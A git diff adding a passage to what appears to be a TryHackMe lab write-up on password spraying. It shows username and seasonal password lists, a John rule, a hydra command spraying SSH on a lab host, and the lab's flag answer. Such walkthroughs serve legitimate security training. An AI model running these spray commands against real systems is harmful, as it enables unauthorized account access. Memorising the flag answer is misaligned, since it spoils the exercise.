@@ -236,8 +236,56 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
 ### Password spray attack 
 
 
-1. 
+1. Perform a password spraying attack to get access to the SSH://10.10.155.132 server to read /etc/flag. What is the flag?
 
+   We first create the following username list with nano.
    
+   ```cmd
+   nano usernames-list.txt   
+   
+   admin
+   phillips
+   burgess
+   pittman
+   guess
+   ```
+   
+   Now we must create a password list as well. Using the hint, we can narrow down the list and rules to make. Lets start with a text files containing the following:
+   
+   ```cmd
+   Spring202
+   Fall202
+   Summer202
+   Winter202
+   ```
+   
+   Now we add the following rule to John:
+   
+   ```cmd
+   [List.Rules:THM-Password-Spray]
+   Az"[0-1][!@]"
+   ```
+   
+   ONLINE SPRAY CONFIG
+   
+   Now we can use these 2 lists in hydra to crack the SSH password.
+   
+   ```cmd
+   hydra -L usernames-list.txt -P wordlist-spray.txt ssh://10.10.155.132 -T 4     
+   ```
+   
+   ONLINE SPRAY HYDRA
+   
+   Use these to login to SSH.
+   
+   ONLINE SPRAY SSH LOGIN
+   
+   Nothing was found in the user folder, so I looked at the history which might give us a hint to the flags location. Lo and behold it did! Otherwise, I would have made a search query for the file using:
+   
+   ```cmd
+   find / -name flag 2>/dev/null
+   ```
+   
+   ONLINE SPRAY FLAG   
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>THM{a97a26e86d09388bbea148f4b870277d}</details>
